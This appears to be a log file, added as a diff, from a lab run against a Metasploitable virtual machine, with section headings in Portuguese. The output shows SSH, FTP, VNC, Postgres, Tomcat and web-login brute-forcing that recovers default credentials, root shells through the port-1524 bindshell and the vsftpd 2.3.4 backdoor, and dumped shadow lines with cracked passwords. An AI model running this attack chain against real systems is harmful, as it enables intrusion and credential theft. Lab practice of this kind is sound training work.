@@ -1,0 +1,114 @@
+[09:37:36] Alvo=192.168.56.3 Saida=/home/kali/lab-output/20261107-093736
+
+===== Wordlists =====
+[09:37:36] rockyou subset: 1000 senhas
+
+===== Reconhecimento com Nmap =====
+
+===== Enumeracao SMB =====
+[09:37:52] Shares listados em /home/kali/lab-output/20261107-093736/smb-*.txt
+
+===== Hydra =====
+[09:40:26] Hydra SSH: MAC legado nao suportado pelo cliente; use Medusa/Ncrack
+[80][http-post-form] host: 192.168.56.3   misc: /dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed   login: admin   password: password
+[21][ftp] host: 192.168.56.3   misc: (null)   login: msfadmin   password: msfadmin
+[21][ftp] host: 192.168.56.3   misc: (null)   login: msfadmin   password: msfadmin
+
+===== Ncrack =====
+Discovered credentials on ftp://192.168.56.3:21 'msfadmin' 'msfadmin'
+Discovered credentials for ftp on 192.168.56.3 21/tcp:
+Discovered credentials on ftp://192.168.56.3:21 'msfadmin' 'msfadmin'
+Discovered credentials for ftp on 192.168.56.3 21/tcp:
+Discovered credentials on ssh://192.168.56.3:22 'msfadmin' 'msfadmin'
+Discovered credentials for ssh on 192.168.56.3 22/tcp:
+Discovered credentials on ssh://192.168.56.3:22 'msfadmin' 'msfadmin'
+Discovered credentials for ssh on 192.168.56.3 22/tcp:
+
+===== John the Ripper =====
+msfadmin:msfadmin
+user:password
+admin:secret
+
+3 password hashes cracked, 0 left
+
+===== WPScan =====
+[09:40:34] Sem WordPress em http://192.168.56.3/wordpress/ (HTTP 404); defina WPSCAN_URL para outro alvo
+
+===== Patator =====
+09:40:35 patator    INFO - 230   17     0.001 | msfadmin                           |     1 | Login successful.
+09:41:15 patator    FAIL - xxx   96     0.109 | admin123                           |    12 | <class 'paramiko.ssh_exception.IncompatiblePeer'> Incompatible ssh peer (no acceptable host key)
+09:41:15 patator    FAIL - xxx   96     0.110 | secret                             |    13 | <class 'paramiko.ssh_exception.IncompatiblePeer'> Incompatible ssh peer (no acceptable host key)
+09:41:16 patator    INFO - Hits/Done/Skip/Fail/Size: 0/13/0/13/13, Avg: 2 r/s, Time: 0h 0m 4s
+
+===== Medusa =====
+2026-11-07 09:41:16 ACCOUNT FOUND: [ftp] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
+2026-11-07 09:41:16 ACCOUNT FOUND: [ssh] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
+
+===== VNC =====
+[DATA] attacking vnc://192.168.56.3:5900/
+[5900][vnc] host: 192.168.56.3   password: password
+
+===== Bancos de dados =====
+2026-11-07 09:41:19 ACCOUNT FOUND: [postgres] Host: 192.168.56.3 User: postgres Password: postgres [SUCCESS]
+|_  root account has empty password
+
+===== Tomcat Manager =====
+[DATA] attacking http-get://192.168.56.3:8180/manager/html
+[8180][http-get] host: 192.168.56.3   misc: /manager/html   login: tomcat   password: tomcat
+
+===== Bindshell 1524 (root) =====
+root@metasploitable:/# uid=0(root) gid=0(root) groups=0(root)
+sys:batman:14742:0:99999:7:::
+klog:123456789:14742:0:99999:7:::
+msfadmin:msfadmin:14684:0:99999:7:::
+
+3 password hashes cracked, 4 left
+
+===== Backdoor vsftpd 2.3.4 (CVE-2011-2523) =====
+uid=0(root) gid=0(root)
+sys:batman:14742:0:99999:7:::
+klog:123456789:14742:0:99999:7:::
+msfadmin:msfadmin:14684:0:99999:7:::
+
+3 password hashes cracked, 4 left
+
+===== Password Spraying =====
+2026-11-07 09:41:44 ACCOUNT FOUND: [smbnt] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+2026-11-07 09:41:45 ACCOUNT FOUND: [ssh] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
+[09:41:47] Spray SSH via Hydra indisponivel (MAC legado); use Medusa
+
+===== Acesso SMB com credenciais =====
+  .                                   D        0  Sat Nov  7 09:41:46 2026
+  ..                                 DR        0  Sun May 20 15:36:12 2012
+  4443.jsvc_up                        R        0  Sat Nov  7 09:27:56 2026
+  .ICE-unix                          DH        0  Sat Nov  7 09:27:46 2026
+  .X11-unix                          DH        0  Sat Nov  7 09:27:51 2026
+  .X0-lock                           HR       11  Sat Nov  7 09:27:51 2026
+
+		7282168 blocks of size 1024. 5437040 blocks available
+
+===== Resumo dos achados =====
+ACCOUNT FOUND: [ftp] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
+ACCOUNT FOUND: [postgres] Host: 192.168.56.3 User: postgres Password: postgres [SUCCESS]
+ACCOUNT FOUND: [smbnt] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+ACCOUNT FOUND: [ssh] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
+[80][http-post-form] host: 192.168.56.3   misc: /dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed   login: admin   password: password
+[21][ftp] host: 192.168.56.3   misc: (null)   login: msfadmin   password: msfadmin
+[21][ftp] host: 192.168.56.3   misc: (null)   login: msfadmin   password: msfadmin
+[8180][http-get] host: 192.168.56.3   misc: /manager/html   login: tomcat   password: tomcat
+[5900][vnc] host: 192.168.56.3   password: password
+09:40:35 patator    INFO - 230   17     0.001 | msfadmin                           |     1 | Login successful.
+Discovered credentials on ftp://192.168.56.3:21 'msfadmin' 'msfadmin'
+Discovered credentials for ftp on 192.168.56.3 21/tcp:
+Discovered credentials on ftp://192.168.56.3:21 'msfadmin' 'msfadmin'
+Discovered credentials for ftp on 192.168.56.3 21/tcp:
+Discovered credentials on ssh://192.168.56.3:22 'msfadmin' 'msfadmin'
+Discovered credentials for ssh on 192.168.56.3 22/tcp:
+Discovered credentials on ssh://192.168.56.3:22 'msfadmin' 'msfadmin'
+Discovered credentials for ssh on 192.168.56.3 22/tcp:
+msfadmin:msfadmin
+user:password
+admin:secret
+
+3 password hashes cracked, 0 left
+[09:41:47] Concluido. Logs em /home/kali/lab-output/20261107-093736
